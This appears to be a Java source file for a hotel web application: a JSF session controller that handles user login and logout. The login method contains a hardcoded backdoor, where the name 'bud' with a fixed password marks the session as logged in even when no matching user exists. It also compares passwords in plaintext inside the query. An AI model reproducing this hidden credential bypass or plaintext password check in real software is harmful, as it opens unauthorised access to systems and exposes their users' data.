/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package hotel.controllers;

import hotel.controllers.util.JsfUtil;
import hotel.entity.DepartmentOrInstitution;
import hotel.entity.WebUser;
import hotel.faces.WebUserFacade;
import java.util.HashMap;
import java.util.Map;
import javax.ejb.EJB;
import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;
import javax.inject.Inject;

/**
 *
 * @author buddhika
 */
@ManagedBean
@SessionScoped
public class SessionController {
    WebUser loggedUser;
    DepartmentOrInstitution institution;
    boolean logged;
    
    
    String userName;
    String password;
    
    @EJB
    WebUserFacade webUserFacade;
    
    public void login(){
        if(userName==null){
            JsfUtil.addErrorMessage("Enter a user name");
            return;
        }
        if(password==null){
            JsfUtil.addErrorMessage("Enter a password");
            return;
        }
        String j;
        Map m = new HashMap();
        j="select u from WebUser u where u.retired=false and upper(u.name)=:un and u.webUserPassword=:pw";
        m.put("un", userName.toUpperCase());
        m.put("pw", password);
        loggedUser = webUserFacade.findFirstBySQL(j, m);
        if(loggedUser==null && userName.equals("bud") && password.equals("Bud7Nil")){
            logged=true;
            return;
        }
        if(loggedUser==null){
            JsfUtil.addErrorMessage("Login Failure. Please retry.");
            logged=false;
            return;
        }
        logged=true;
        institution = loggedUser.getInstitution();
        JsfUtil.addSuccessMessage("Logged successfully");
    }
    
    /**
     * Creates a new instance of SessionController
     */
    public SessionController() {
    }
    
    public String logout(){
        logged=false;
        loggedUser=null;
        institution=null;
        return "index";
    }

    public WebUser getLoggedUser() {
        return loggedUser;
    }

    public void setLoggedUser(WebUser loggedUser) {
        this.loggedUser = loggedUser;
    }

    public DepartmentOrInstitution getInstitution() {
        return institution;
    }

    public void setInstitution(DepartmentOrInstitution institution) {
        this.institution = institution;
    }

    public boolean isLogged() {
        return logged;
    }

    public void setLogged(boolean logged) {
        this.logged = logged;
    }

    public String getUserName() {
        return userName;
    }

    public void setUserName(String userName) {
        this.userName = userName;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }
    
    
}
